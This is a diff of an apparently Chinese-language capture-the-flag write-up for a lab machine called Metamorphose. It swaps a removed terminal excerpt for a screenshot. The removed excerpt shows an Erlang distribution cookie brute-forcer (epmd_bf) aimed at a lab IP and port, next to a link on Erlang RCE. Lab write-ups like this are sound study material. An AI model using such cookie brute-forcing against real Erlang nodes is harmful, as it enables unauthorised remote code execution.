@@ -175,31 +175,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 发现这个cookie有迹可循的，尝试寻找现成的解决方案：https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
 
-```bash
-┌──(kali💀kali)-[~/temp/Metamorphose]
-└─$ ls    
-epmd_bf  erldp-info.nse  wget-log
-
-┌──(kali💀kali)-[~/temp/Metamorphose]
-└─$ cd epmd_bf          
-
-┌──(kali💀kali)-[~/temp/Metamorphose/epmd_bf]
-└─$ ls
-ebin  Emakefile  Makefile  priv  src
-
-┌──(kali💀kali)-[~/temp/Metamorphose/epmd_bf]
-└─$ tail src/epmd_bf.erl 
-            stop;
-        failed ->
-            bf_cookie({IP, Port}, Alphabet, next(Cookie, Alphabet));
-        _ ->
-            stop
-    end.
-
-test() ->
-    Alphabet = lists:seq($A,$Z),
-    bf_cookie({{172.20.10.3}, 32837}, Alphabet, gen_first(20, Alphabet)).
-```
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060109324.png" alt="image-20240806010941874" style="zoom:33%;" />
 
 尝试进行利用，但是不行，换一个试试：
 
